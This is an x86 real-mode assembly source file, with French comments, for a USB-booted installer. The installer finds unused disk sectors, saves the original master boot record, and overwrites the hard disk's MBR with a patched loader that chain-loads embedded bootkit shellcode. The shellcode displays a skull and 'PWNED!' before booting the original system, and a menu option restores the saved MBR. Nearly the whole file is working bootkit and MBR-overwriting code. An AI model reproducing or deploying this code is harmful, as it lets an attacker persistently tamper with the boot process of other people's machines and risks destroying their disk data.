org 0800h

jmp start

welcomemsg:
db "[-] Press 1 to install the bootkit or 2 to restore saved MBR code.",0ah,0dh,0h
installmsg:
db "[-] Press ENTER to install the bootkit.",0ah,0dh,0h
restore_msg:
db "[-] Press ENTER to restore saved MBR.",0ah,0dh,0h
notfound:
db "[-] No code cave available.",0ah,0dh,0h
magic_flag_error_msg:
; db "[-] Bad USB key checksum. Try removing other devices.",0ah,0dh,0h
mbr_empty_error_msg:
db "[-] No saved MBR.",0ah,0dh,0h
finish_msg:
db "[-] Finished.",0ah,0dh,0h
interrupt_error_msg:
db "[-] Interrupt error !",0ah,0dh,0h
bootkit_shellcode:
db 0e9h,076h,006h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,06fh,06fh,06fh,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,06fh,06fh,06fh,06fh,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,06fh,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,06fh,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,06fh,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,06fh,020h,020h,020h,020h,020h,020h,020h,020h,020h,06fh,024h,020h,020h,020h,024h,024h,020h,06fh,024h,00dh,00ah,020h,020h,020h,06fh,020h,024h,020h,06fh,06fh,020h,020h,020h,020h,020h,020h,020h,020h,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,06fh,020h,020h,020h,020h,020h,020h,020h,024h,024h,020h,024h,024h,020h,024h,024h,06fh,024h,00dh,00ah,06fh,06fh,020h,024h,020h,024h,020h,022h,024h,020h,020h,020h,020h,020h,020h,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,06fh,020h,020h,020h,020h,020h,020h,020h,024h,024h,024h,06fh,024h,024h,06fh,024h,00dh,00ah,022h,024h,024h,024h,024h,024h,024h,06fh,024h,020h,020h,020h,020h,020h,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,06fh,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,00dh,00ah,020h,020h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,00dh,00ah,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,022h,022h,022h,024h,024h,024h,00dh,00ah,020h,020h,020h,022h,024h,024h,024h,022h,022h,022h,022h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,020h,022h,024h,024h,024h,00dh,00ah,020h,020h,020h,020h,024h,024h,024h,020h,020h,020h,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,020h,022h,024h,024h,024h,06fh,00dh,00ah,020h,020h,020h,06fh,024h,024h,022h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,020h,020h,020h,024h,024h,024h,06fh,00dh,00ah,020h,020h,020h,024h,024h,024h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,022h,020h,022h,024h,024h,024h,024h,024h,024h,06fh,06fh,06fh,06fh,06fh,024h,024h,024h,024h,06fh,00dh,00ah,020h,020h,06fh,024h,024h,024h,06fh,06fh,06fh,06fh,024h,024h,024h,024h,024h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,00dh,00ah,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,022h,024h,024h,024h,024h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,020h,020h,020h,020h,020h,024h,024h,024h,024h,022h,022h,022h,022h,022h,022h,022h,022h,00dh,00ah,020h,022h,022h,022h,022h,020h,020h,020h,020h,020h,020h,020h,024h,024h,024h,024h,020h,020h,020h,020h,022h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,022h,020h,020h,020h,020h,020h,020h,06fh,024h,024h,024h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,022h,024h,024h,024h,06fh,020h,020h,020h,020h,020h,022h,022h,022h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,022h,024h,024h,022h,020h,020h,020h,020h,020h,020h,020h,020h,020h,024h,024h,024h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,024h,024h,024h,06fh,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,022h,024h,024h,022h,022h,024h,024h,024h,024h,024h,024h,022h,022h,022h,022h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,06fh,024h,024h,024h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,024h,024h,024h,024h,06fh,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,06fh,06fh,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,06fh,024h,024h,024h,022h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,022h,024h,024h,024h,024h,06fh,020h,020h,020h,020h,020h,020h,06fh,024h,024h,024h,024h,024h,024h,06fh,022h,024h,024h,024h,024h,06fh,020h,020h,020h,020h,020h,020h,020h,020h,06fh,024h,024h,024h,024h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,022h,024h,024h,024h,024h,024h,06fh,06fh,020h,020h,020h,020h,020h,022h,022h,024h,024h,024h,024h,06fh,024h,024h,024h,024h,024h,06fh,020h,020h,020h,06fh,024h,024h,024h,024h,022h,022h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,022h,022h,024h,024h,024h,024h,024h,06fh,06fh,06fh,06fh,020h,020h,022h,024h,024h,024h,06fh,024h,024h,024h,024h,024h,024h,024h,024h,024h,022h,022h,022h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,022h,022h,024h,024h,024h,024h,024h,024h,024h,06fh,06fh,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,022h,022h,022h,022h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,024h,024h,024h,024h,024h,024h,024h,024h,024h,024h,022h,00dh,00ah,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,020h,022h,024h,024h,024h,022h,022h,022h,022h,00dh,00ah,00dh,00ah,050h,057h,04eh,045h,044h,021h,00dh,00ah,000h,0ach,03ch,000h,074h,006h,0b4h,00eh,0cdh,010h,0ebh,0f5h,0c3h,0b4h,000h,0b0h,012h,0cdh,010h,0b3h,00eh,0beh,003h,006h,0e8h,0e6h,0ffh,0b4h,000h,0cdh,016h,0b0h,001h,0b5h,000h,0b1h,002h,0b6h,000h,0b2h,080h,0bbh,000h,000h,08eh,0c3h,0bbh,000h,07ch,0b4h,002h,0cdh,013h,0bbh,000h,000h,053h,0bbh,000h,07ch,053h,0cbh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
bootloader_shellcode:
db 08Ch,0C8h,08Eh,0D8h,08Eh,0D0h,0BCh,000h,07Ch,0B0h,004h,0B5h,000h,0B1h,001h,0B6h,000h,0B2h,080h,0BBh,000h,000h,08Eh,0C3h,0BBh,000h,006h,0B4h,002h,0CDh,013h,0BBh,000h,000h,053h,0BBh,000h,006h,053h,0CBh,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
step_1:
db "[-] Searching code cave.",0ah,0dh,0h
step_2:
db "[-] Patching bootloader.",0ah,0dh,0h
step_3:
db "[-] Saving MBR on key.",0ah,0dh,0h
step_4:
db "[-] Saving MBR on drive.",0ah,0dh,0h
step_5:
db "[-] Writing bootkit code.",0ah,0dh,0h
step_6:
db "[-] Read sector.",0ah,0dh,0h
step_7:
db "[-] Writing bootloader.",0ah,0dh,0h
restore_1:
db "[-] Reading saved bootloader.",0ah,0dh,0h
restore_2:
db "[-] Restoring bootloader.",0ah,0dh,0h

print_str:
push ax
printloop:
lodsb				; charge [si] dans al
cmp al, 00h			; fin de string ?
jz printend			; oui => return
mov ah, 0eh			; display char
int 10h				; print screen
jmp printloop		; boucle
printend:
pop ax
ret

; attend qu'on tape sur entree
wait_for_enter:
push ax
readloop:
mov ah, 00h
int 16h
cmp ah, 1Ch
jnz readloop
pop ax
ret

; shutdown system
shutdown:
mov ah, 42h
mov al, 0h
int 15h
infinite:
xor al, al
jmp infinite
ret

exit_error:
mov bl, 4h
call print_str
call wait_for_enter
jmp shutdown

interrupt_error:
mov si, interrupt_error_msg
jmp exit_error

finish:
mov bl, 0eh
mov si, finish_msg
call print_str
; attend qu'on tape sur entree
call wait_for_enter
jmp shutdown

load_sector_at_0600:
push ax
push bx
push cx
push dx
push si
mov si, step_6
mov bl, 0eh
call print_str
mov al, 01h		; nb de secteurs : 1
mov ch, 00h		; track : 0
;mov cl, 03h	; secteur : 3
mov dh, 00h		; head : 0
mov dl, 81h		; drive : disque dur 0
mov bx, 00h
mov es, bx
mov bx, 0600h	; destination (vmem) : 0x0000:0x0600
mov ah, 02h		; operation : read sectors from drive
int 13h
jc interrupt_error
pop si
pop dx
pop cx
pop bx
pop ax
ret

start:
; stack init
mov ax, cs		; init de la stack a 7c00
mov ds, ax
mov ss, ax
mov sp, 7c00h

; set l'affichage en graphic
mov ah, 0h
mov al, 12h
int 10h

; affiche le message de bienvenue
mov si, welcomemsg
mov bl, 0eh
call print_str

; menu
readloop2:
mov ah, 00h
int 16h
cmp al, 31h
jz installbootkit
cmp al, 32h
jz restorembr
jmp readloop2
; b3 s4f3
jmp infinite

; #######################################################################
;		INSTALL BOOTKIT PROC
; #######################################################################

installbootkit:
mov si, installmsg
mov bl, 0eh
call print_str
call wait_for_enter

mov si, step_1
mov bl, 0eh
call print_str

mov si, 0
mov dl, 1

parcourir_secteurs:							; do{
	mov cl, dl								;	
	call load_sector_at_0600				; 	load_sector_at_0600(i);
	mov bx, 600h							;	ptr = 0x600;
	loop_secteur:							;	do{
		mov al, [bx]
		cmp al, 0h							;		if(*ptr != 0)
		jz is_zero							;		{
			mov si, 0						;			cpt_secteurs=0;
			jmp next_sector					;			goto next
		is_zero:							;		}
		inc bx								;
		cmp bx, 800h						;		ptr++;
		jnz loop_secteur					;	}while(ptr<0x800);
	inc si									;	cpt_secteurs++;
	cmp si, 4								; 	if(cpt_secteurs == 4)
	jz code_cave_found						; 		goto code_cave_found;
	next_sector:							;	next:
	inc dl
	cmp dl, 63								; 	i++;
	jnz parcourir_secteurs					; }while(i<63);
	
; pas de code cave => exit
code_cave_not_found:
mov si, notfound
call exit_error

code_cave_found:
; sauvegarde l'offset
push si
; load le MBR a 0600h
mov cl, 1h
call load_sector_at_0600


mov si, step_2
mov bl, 0eh
call print_str

; copie la table de partition dans le shellcode bootloader
mov cx, 1b8h
mov bx, bootloader_shellcode
add bx, cx
mov si, 7b8h
copy_table_install_loop:
	mov al, [si]
	mov [bx], al
	inc si
	inc bx
	inc cx
	cmp cx, 200h
	jnz copy_table_install_loop


mov si, step_3
mov bl, 0eh
call print_str
	
; ecrit le MBR sur la cle (offset 10h)
mov al, 01h		; 1 secteur
mov ch, 00h		; track / cylinder
mov cl, 10h		; sector, 0x10
mov dh, 00h		; head
mov dl, 80h		; drive : disque dur 1 (cle USB... normalement)
mov bx, 00h
mov es, bx
mov bx, 0600h	;
mov ah, 03h
int 13h
;jc interrupt_error

mov si, step_4
mov bl, 0eh
call print_str

; ecrit le MBR sur le disque (offset sauvegarde)
pop cx
mov al, 01h		; 1 secteur
mov ch, 00h		; track / cylinder
mov dh, 00h		; head
mov dl, 81h		; disque dur
mov bx, 00h
mov es, bx
mov bx, 0600h
mov ah, 03h
int 13h
jc interrupt_error


; patch le code de bootkit (num du secteur contenant le mbr)
mov si, bootkit_shellcode
add si, 690h
mov [si], cl

; patch le code de bootloader (num du secteur ou on charge le bootkit)
mov si, bootloader_shellcode
add si, 0eh
inc cl
mov [si], cl

mov si, step_5
mov bl, 0eh
call print_str

; ecrit le bootkit patche sur le disque
mov al, 04h		; 4 secteurs
mov ch, 00h		; track / cylinder
mov dh, 00h		; head
mov dl, 81h		; disque dur
mov bx, 00h
mov es, bx
mov bx, bootkit_shellcode
mov ah, 03h
int 13h
jc interrupt_error

mov si, step_7
mov bl, 0eh
call print_str

; ecrit le bootloader patche sur le disque
mov al, 01h		; 1 secteur
mov ch, 00h		; track / cylinder
mov cl, 01h		; 1er secteur
mov dh, 00h		; head
mov dl, 81h		; disque dur
mov bx, 00h
mov es, bx
mov bx, bootloader_shellcode
mov ah, 03h
int 13h
jc interrupt_error

; fini !
jmp finish


  
; #######################################################################
;		RESTORE MBR PROC
; #######################################################################
  
restorembr:
mov si, restore_msg
mov bl, 0eh
call print_str
call wait_for_enter

; ; load le secteur 0xF et verif la signature
; mov al, 01h		; nb de secteurs : 1
; mov ch, 00h		; track : 0
; mov cl, 0Fh		; secteur : 0xF
; mov dh, 00h		; head : 0
; mov dl, 80h		; drive : disque dur 1 (cle USB)
; mov bx, 00h
; mov es, bx
; mov bx, 0600h	; destination (vmem) : 0x0000:0x0600
; mov ah, 02h		; operation : read sectors from drive
; int 13h
; jc interrupt_error


; mov si, restore_1
; mov bl, 0eh
; call print_str

; ; check signature
; mov ax, word [bx]
; cmp ax, 0b007h
; jnz magic_flag_not_verified
; add bx, 2
; mov ax, word [bx]
; cmp ax, 0b007h
; jz magic_flag_verified
; magic_flag_not_verified:
; mov si, magic_flag_error_msg
; call exit_error

magic_flag_verified:
; load le secteur 0x10
mov al, 01h		; nb de secteurs : 1
mov ch, 00h		; track : 0
mov cl, 10h		; secteur : 0x10
mov dh, 00h		; head : 0
mov dl, 80h		; drive : disque dur 1 (cle USB)
mov bx, 00h
mov es, bx
mov bx, 0600h	; destination (vmem) : 0x0000:0x0600
mov ah, 02h		; operation : read sectors from drive
int 13h
jc interrupt_error

; verifie qu'il ne soit pas vide
mov cx, 0
verify_loop:
	mov al, [bx]
	cmp al, 0
	jnz quick_skip
	inc cx
	quick_skip:
	inc bx
	cmp bx, 0610h
	jnz verify_loop

cmp cx, 10h
jnz mbr_not_empty
; 16 octets vides => erreur
mov si, mbr_empty_error_msg
call exit_error

mov si, restore_2
mov bl, 0eh
call print_str

mbr_not_empty:
; charge le MBR actuel a 1000
mov al, 01h		; nb de secteurs : 1
mov ch, 00h		; track : 0
mov cl, 01h		; secteur : 0x10
mov dh, 00h		; head : 0
mov dl, 81h		; drive : disque dur 0
mov bx, 00h
mov es, bx
mov bx, 1000h	; destination (vmem) : 0x0000:0x1000
mov ah, 02h		; operation : read sectors from drive
int 13h
jc interrupt_error

; copie la table de partition
mov bx, 7b8h
mov si, 11b8h
copy_table_restore_loop:
	mov al, [si]
	mov [bx], al
	inc si
	inc bx
	cmp bx, 800h
	jnz copy_table_restore_loop

; ecrit le secteur sur le disque
mov al, 01h
mov ch, 00h		; track / cylinder
mov cl, 01h		; sector
mov dh, 00h		; head
mov dl, 81h		; drive : disque dur 0
mov bx, 00h
mov es, bx
mov bx, 0600h	;
mov ah, 03h
int 13h
jc interrupt_error

jmp finish


